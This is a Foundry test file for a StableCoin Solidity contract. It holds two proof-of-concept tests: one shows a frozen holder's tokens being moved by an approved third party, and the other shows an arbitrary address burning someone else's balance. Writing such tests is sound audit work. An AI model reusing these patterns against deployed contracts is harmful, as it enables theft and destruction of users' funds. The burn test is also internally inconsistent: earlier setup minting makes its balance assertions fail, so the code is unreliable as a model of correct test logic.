// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "../src/StableCoin.sol";

contract StableCoinTest is Test {
    StableCoin public token;
    address public owner;
    address public alice;
    address public bob;

    function setUp() public {
        owner = address(this);
        alice = address(0x1);
        bob = address(0x2);
        
        token = new StableCoin();
        
        // Mint some tokens to Alice
        token.mint(alice, 1000e18);
    }

    function testFreezeBypass() public {
        // Step 1: Alice gets frozen
        token.freeze(alice);
        assertTrue(token.isFrozen(alice));
        
        // Step 2: Alice approves Bob (who isn't frozen)
        vm.prank(alice);
        token.approve(bob, 1000e18);
        
        // Step 3: Bob can still transfer Alice's tokens
        vm.prank(bob);
        bool success = token.transferFrom(alice, bob, 500e18);
        assertTrue(success);
        assertEq(token.balanceOf(bob), 500e18);
    }

    function testBurnVulnerability() public {
    // Mint exact amount we want to test
        token.mint(alice, 100000e18);
        assertEq(token.balanceOf(alice), 100000e18);
        
        // Bob burns Alice's tokens
        vm.prank(bob);
        token.burn(alice, 100000e18);
        assertEq(token.balanceOf(alice), 0);
    }
}